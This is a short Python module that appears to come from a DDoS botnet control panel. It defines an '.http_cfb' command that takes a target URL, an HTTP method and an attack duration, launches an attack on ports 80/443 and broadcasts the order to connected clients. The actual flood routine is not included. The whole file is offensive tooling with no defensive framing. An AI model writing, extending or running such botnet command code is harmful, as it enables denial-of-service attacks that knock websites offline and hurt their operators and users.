from colorama import Fore

def http_cfb(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_cfb [URL] [HTTP_METHODS] [TIME]')

